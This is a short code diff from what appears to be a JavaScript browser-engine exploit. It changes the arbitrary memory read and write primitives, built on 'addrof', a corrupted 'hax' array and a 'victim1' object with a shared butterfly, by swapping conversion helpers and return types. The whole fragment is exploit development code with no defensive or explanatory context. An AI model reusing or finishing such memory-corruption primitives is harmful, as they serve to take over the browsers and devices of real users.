@@ -563,11 +563,11 @@ for (var i = 0; i < 1000; ++i) {
                 offset *= 8
                 return this.readInt64(where+offset);
             }
-            hax[1] = (Add(where , new Int64("0x10"))).asDouble();
+            hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
-            return res;
+            return new Int64(res);
         },
         write(addr, data) {
             while (data.length % 4 != 0)
@@ -581,7 +581,7 @@ for (var i = 0; i < 1000; ++i) {
         },
         
         read(addr, length) {
-            var a = new Uint8Array(length);
+            var a = new Array(length);
             var i;
             var v;
 
